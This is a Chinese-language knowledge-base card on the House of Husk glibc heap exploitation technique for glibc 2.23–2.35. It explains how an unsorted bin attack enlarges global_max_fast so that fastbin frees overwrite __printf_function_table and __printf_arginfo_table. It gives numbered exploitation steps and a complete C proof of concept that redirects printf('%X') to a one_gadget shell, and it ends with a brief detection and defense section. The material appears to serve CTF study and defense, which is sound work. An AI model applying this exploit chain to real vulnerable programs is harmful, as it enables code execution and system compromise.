---
id: binary-pwn-heap-house-of-husk-printf-arginfo-table-global-max-fast-onegadget
title: House of Husk（glibc 2.23–2.35）：unsorted bin attack 放大 global_max_fast，借 main_arena fastbin 数组改写 __printf_function_table/__printf_arginfo_table 后 printf("%X") 调 one_gadget
type: scenario
domain: binary
path: binary/pwn/heap
technique: house-of-husk-printf-arginfo-table-global-max-fast
tags:
- pwn
- heap
- glibc223
- glibc227
- glibc231
- glibc235
- house-of-husk
- printf
- printf-arginfo-table
- global-max-fast
- unsorted-bin
- one-gadget
- ctf
cve: []
severity: high
confidence: high
status: verified
affected_versions: glibc 2.23–2.35（原文『glibc 2.23--2.35 版本中，该手法均可用』）
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V277
  verified_at: '2026-11-07T23:43:55+08:00'
  notes: 已对照原文与全部8张图：vfprintf.c:1336 慢路径判断、printf_positional 源码、__parse_one_specmb+292 eax=0x58、call rax 到 exec_comm+2508、printf-parsemb.c:316 的 (*__printf_arginfo_table[spec]) 调用均与卡一致；global_max_fast 0x7ffff7dcfca0（main_arena+96）与 __printf_arginfo_table=0x60bb90/__printf_function_table=0x602760 截图一致。原文标 glibc 2.23-2.35，卡已注明图片为 2.27 源码且偏移需按目标 libc 替换。未编译运行 PoC。dup-scan 与 14816 通用 House of Husk 卡 pair 判 related：该卡用 .bss 大块写/largebin attack，本卡为 unsorted bin→global_max_fast→fastbin 数组专链，写原语与 PoC 不同，两卡并列保留。
url: /docs/binary/pwn/heap/binary-pwn-heap-house-of-husk-printf-arginfo-table-global-max-fast-onegadget/
draft: false
kb_aliases:
- House of Husk
- house_of_husk
- __printf_arginfo_table
- __printf_function_table
- printf_positional 劫持
- __parse_one_specmb 函数指针
- global_max_fast 放大打 printf 表
---

## 一句话结论

House of Husk 用任意写把 `__printf_function_table` 置为非空、把 `__printf_arginfo_table` 指向可控内存，并使 `__printf_arginfo_table['X']` 等于后门/one_gadget；随后任意一次 `printf` 因检测到 printf handler 表非空而走慢路径 `vfprintf → do_positional → printf_positional → __parse_one_specmb`，最终调用 `(*__printf_arginfo_table[spec])(...)`，把格式化解析变成受控函数调用。文章给出的 PoC 用 UAF + unsorted bin attack 把 `global_max_fast` 改写成一个很大的 libc 地址，使所有 `free` 走 fastbin，并利用 fastbin 头指针写入 `main_arena` 数组的特性，按目标偏移挑选 chunk 大小，直接把堆地址写进上述两个 printf 全局表指针。

## 原理

- **调用链**：
  1. `printf(format, ...)` → `vfprintf(stdout, format, arg)`；
  2. `vfprintf` 开头检查：
     ```c
     if (__glibc_unlikely (__printf_function_table != NULL
               || __printf_modifier_table != NULL
               || __printf_va_arg_table != NULL))
         goto do_positional;
     ```
     任意一个表非空即进入慢路径（原文也提到通常可通过改 `__printf_va_arg_table` 实现）；
  3. `do_positional` → `printf_positional(...)`；
  4. `printf_positional` 逐段解析格式串时调用 `__parse_one_specmb(f, nargs, &specs[nspecs], &max_ref_arg)`；
  5. `__parse_one_specmb` 中：
     ```c
     if (__builtin_expect (__printf_function_table == NULL, 1)
         || spec->info.spec > UCHAR_MAX
         || __printf_arginfo_table[spec->info.spec] == NULL
         || (int)(spec->ndata_args = (*__printf_arginfo_table[spec->info.spec])
                  (&spec->info, 1, &spec->data_arg_type, &spec->size)) < 0)
       { /* 内置格式处理 */ }
     ```
     条件全部满足时执行 `(*__printf_arginfo_table[spec->info.spec])(...)`，这就是被劫持的函数指针调用点。
- **表的来源**：`__register_printf_specifier(spec, converter, arginfo)` 在 `__printf_function_table == NULL` 时用
  ```c
  __printf_arginfo_table = calloc(UCHAR_MAX + 1, sizeof(void*) * 2);
  __printf_function_table = (printf_function **)(__printf_arginfo_table + UCHAR_MAX + 1);
  ```
  分配两张相邻的 0x100 项表（`spec` 取值 0–0xff），`__printf_function_table[spec]` 与 `__printf_arginfo_table[spec]` 分别保存 converter/arginfo；`%X` 的 spec 为 `0x58`（88）。
- **House of Husk 的写原语**（文章 PoC）：
  1. 先 UAF 泄漏 libc（unsorted bin 的 fd）；
  2. 准备两个 chunk，大小按 `offset2size(ofs) = ofs * 2 - 0x10` 计算，使它们被 free 后进入的 fastbin slot 偏移分别落在 `__printf_function_table` 与 `__printf_arginfo_table` 上；
  3. unsorted bin attack：把已释放 chunk 的 `bk` 改为 `libc + GLOBAL_MAX_FAST - 0x10`，再 `malloc` 取出该 chunk，`bck->fd = unsorted_chunks(av)` 会把一个远大于普通 chunk 的 libc 地址（`main_arena` 附近，PoC 中为 `main_arena+0x60`）写进 `global_max_fast`；
  4. `global_max_fast` 变大后，几乎所有释放的 chunk 都按 fastbin 处理；fastbin 头指针数组从 `main_arena+8` 起连续存放，`free` 不同大小的 chunk 就会把 chunk 地址写到 `main_arena+8+8*idx`。选择 idx 使该位置正好等于两个 printf 表指针的地址，`free(a[1])`/`free(a[2])` 就分别把 `__printf_function_table`、`__printf_arginfo_table` 改写成这两个堆 chunk 的地址（非空且可控）；
  5. 预先在 a[2] 的相应位置写入 `one_gadget`：由于 fastbin 写入的是 chunk 头地址（`a[2]-0x10`），`__printf_arginfo_table['X']` 实际位于 `a[2] + ('X'-2)*8`，PoC 正是把 one_gadget 写在这里；
  6. 触发 `printf("%X", 0)`：慢路径进入 `__parse_one_specmb`，调用 `__printf_arginfo_table['X'](...)` = one_gadget。
- 该链不依赖覆盖 GOT/vtable，而是滥用 glibc 为“用户自定义 printf 格式符”保留的两张全局函数表；`global_max_fast` 放大只是达成“把堆地址精确写进 libc 全局指针”的手段。

## 触发条件

- glibc 2.23–2.35（原文标注区间；`__printf_function_table`/`__printf_arginfo_table` 与慢路径逻辑存在）。
- 存在堆 UAF/任意写，能完成 unsorted bin attack 改写 `global_max_fast`，并能控制若干 chunk 的释放大小与内容。
- 目标进程在利用后仍会执行至少一次 `printf` 族调用（或任何走 `vfprintf` 的格式化输出），且格式串中包含可控/固定的 `%X` 等 spec。
- 已知 libc 版本偏移（`main_arena`、`__printf_function_table`、`__printf_arginfo_table`、`global_max_fast`、one_gadget），或能泄漏 libc 并用 libc-database 定位。

## 利用步骤

1. 用 UAF/unsorted bin 泄漏 libc 基址，计算 `main_arena`、`global_max_fast`、`__printf_function_table`、`__printf_arginfo_table`、目标 one_gadget 偏移。
2. 按 `offset2size(PRINTF_FUNCTABLE - MAIN_ARENA)` 与 `offset2size(PRINTF_ARGINFO - MAIN_ARENA)` 申请两个“占位”chunk（原文 PoC 的 `a[1]`、`a[2]`），再申请一块防止合并的 chunk。
3. 在 `a[2] + ('X'-2)*8` 写入 `libc + ONE_GADGET`（`%X` 的 spec=0x58）。
4. unsorted bin attack：把已释放 `a[0]` 的 `bk` 改为 `libc + global_max_fast - 0x10`，再 `malloc` 取回，使 `global_max_fast` 变成一个很大的 libc 地址（PoC 为 `main_arena+0x60`）。
5. 依次 `free(a[1])`、`free(a[2])`：fastbin 头指针写入 `main_arena` 数组，分别把 `__printf_function_table`、`__printf_arginfo_table` 改成堆地址；前者非空即触发慢路径，后者指向可控 chunk。
6. 执行 `printf("%X", 0)`（或任意含 `%X` 的格式化输出），`__parse_one_specmb` 调用 `__printf_arginfo_table[0x58]`，跳到 one_gadget 拿 shell。
7. 若 one_gadget 约束不满足，可把表项改成后门函数/栈迁移 gadget，或改用 `__printf_function_table` 槽位（原文 PoC 注释掉的另一种写法）。

## PoC

文章 PoC（源自 ptr-yudai，偏移为示例 libc，实际需按目标 libc 调整）：

```c
#include <stdio.h>
#include <stdlib.h>

#define offset2size(ofs) ((ofs) * 2 - 0x10)
#define MAIN_ARENA       0x3ebc40
#define MAIN_ARENA_DELTA 0x60
#define GLOBAL_MAX_FAST  0x3ed940
#define PRINTF_FUNCTABLE 0x3f0658
#define PRINTF_ARGINFO   0x3ec870
#define ONE_GADGET       0x10a38c

int main(void) {
  unsigned long libc_base;
  char *a[10];
  setbuf(stdout, NULL);

  /* 1. UAF 泄漏 libc */
  a[0] = malloc(0x500);
  a[1] = malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));
  a[2] = malloc(offset2size(PRINTF_ARGINFO - MAIN_ARENA));
  a[3] = malloc(0x500);              /* 防止合并 */
  free(a[0]);
  libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;

  /* 2. 预置 __printf_arginfo_table['X'] = one_gadget */
  *(unsigned long*)(a[2] + ('X' - 2) * 8) = libc_base + ONE_GADGET;

  /* 3. unsorted bin attack 放大 global_max_fast */
  *(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;
  a[0] = malloc(0x500);

  /* 4. free 时 fastbin 头指针写入 main_arena，覆盖两张 printf 表 */
  free(a[1]);   /* __printf_function_table => 非空堆地址 */
  free(a[2]);   /* __printf_arginfo_table => 堆地址，['X']=one_gadget */

  /* 5. 触发 */
  printf("%X", 0);
  return 0;
}
```

## 变体与关联

- 变体：把 one_gadget 写进 `__printf_function_table[spec]`（PoC 中被注释的写法），或在 `__printf_arginfo_table[spec]` 放后门函数/栈迁移 gadget；spec 可换成任意 `0x00–0xff` 字符（只要格式串里出现对应 `%c`）。
- 变体：`global_max_fast` 放大后也可用于其他“借 main_arena fastbin 数组向 libc 全局指针写堆地址”的目标（如 `__free_hook`、`__malloc_hook` 邻近字段），思路与既有 global_max_fast 卡不同。
- 关联：[[binary-pwn-heap-unsorted-bin-global-max-fast-bss-fake-fastbin-free-hook]]（同样放大 `global_max_fast`，但目标是 BSS 假 fastbin 块 + `__free_hook`）；[[binary-pwn-heap-house-of-pig-io-str-overflow-tcache-stashing-freehook-system]]（同为 2.31–2.34 的全局指针/IO 链组合，但走 FSOP 而非 printf 表）；`one_gadget` 约束卡与 unsorted bin attack 基础卡。
- 注意：文章动态调试使用的是 glibc 2.27 源码/偏移（图片中 printf-parsemb.c 路径为 2.27），文中偏移（`MAIN_ARENA=0x3ebc40` 等）需按实际 libc 版本替换。

## 检测与防御

- 版本/加固：`__printf_function_table` 等表是 glibc 内部全局变量，普通 RELRO 不覆盖；可通过升级 glibc、开启更严格的 malloc 检查与 safe-linking 提高利用门槛（但 House of Husk 本身在 2.23–2.35 可用）。
- 代码审计：消除堆 UAF/任意写、unsorted bin 攻击与可控 `free` 大小；不要允许攻击者影响 `printf` 格式串以外的 glibc 全局状态。
- 检测：监控 `global_max_fast` 被改成异常大的 libc 地址、`__printf_function_table`/`__printf_arginfo_table` 指向堆、`__parse_one_specmb` 出现异常调用目标；崩溃日志中的 unsorted bin/smallbin 损坏也可作为试探信号。
- 运行防护：使用现代分配器（hardened malloc/scudo）或堆隔离；对高权限服务限制格式化输出路径与堆布局可控性。
